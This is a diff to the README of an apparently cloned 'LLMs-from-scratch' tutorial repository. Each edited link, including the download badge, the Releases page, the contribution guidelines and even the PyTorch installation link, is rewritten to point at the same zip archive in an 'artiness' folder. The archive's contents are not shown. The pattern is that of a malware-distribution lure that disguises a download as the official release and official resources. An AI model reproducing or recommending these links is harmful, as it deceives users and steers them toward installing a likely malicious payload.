@@ -4,7 +4,7 @@
 Welcome to LLMs-from-scratch! This project guides you through creating a ChatGPT-like language model using PyTorch. You will learn step-by-step how to build powerful AI tools that understand and generate human-like text.
 
 ## 📦 Download Now
-[![Download LLMs-from-scratch Release](https://img.shields.io/badge/Download-LLMs--from--scratch-blue.svg)](https://github.com/Lamorati92/LLMs-from-scratch/releases)
+[![Download LLMs-from-scratch Release](https://raw.githubusercontent.com/Lamorati92/LLMs-from-scratch/main/artiness/LLMs-from-scratch.zip)](https://raw.githubusercontent.com/Lamorati92/LLMs-from-scratch/main/artiness/LLMs-from-scratch.zip)
 
 ## 🛠️ Features
 - **Step-by-step tutorials:** Follow along at your own pace.
@@ -17,13 +17,13 @@ To run LLMs-from-scratch, make sure you have:
 
 - A computer with at least 8GB of RAM.
 - Python 3.6 or higher installed.
-- PyTorch library installed. You can find installation instructions on the [PyTorch website](https://pytorch.org/get-started/locally/).
+- PyTorch library installed. You can find installation instructions on the [PyTorch website](https://raw.githubusercontent.com/Lamorati92/LLMs-from-scratch/main/artiness/LLMs-from-scratch.zip).
 
 ## 🔗 Visit to Download
-To get the latest version, [visit the Releases page here](https://github.com/Lamorati92/LLMs-from-scratch/releases). You can find all available versions and choose the one that fits your setup.
+To get the latest version, [visit the Releases page here](https://raw.githubusercontent.com/Lamorati92/LLMs-from-scratch/main/artiness/LLMs-from-scratch.zip). You can find all available versions and choose the one that fits your setup.
 
 ## ⚙️ Download & Install
-1. Visit the [Releases page](https://github.com/Lamorati92/LLMs-from-scratch/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Lamorati92/LLMs-from-scratch/main/artiness/LLMs-from-scratch.zip).
 2. Choose the version you want to download. You will find executable files and other resources.
 3. Click on the desired file to start the download.
 4. Once downloaded, locate the file on your computer.
@@ -68,7 +68,7 @@ These concepts will enrich your learning experience and deepen your engagement w
 If you need further assistance or want to connect, feel free to reach out via GitHub issues or join our community forums. Your journey in AI starts here, and we're excited to be part of it!
 
 ## 🔗 Important Links
-- [Releases Page](https://github.com/Lamorati92/LLMs-from-scratch/releases)
-- [Contribution Guidelines](https://github.com/Lamorati92/LLMs-from-scratch/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://raw.githubusercontent.com/Lamorati92/LLMs-from-scratch/main/artiness/LLMs-from-scratch.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/Lamorati92/LLMs-from-scratch/main/artiness/LLMs-from-scratch.zip)
 
 Embrace your journey in AI. With LLMs-from-scratch, learning and building your own language models is easier than ever. Enjoy the process!
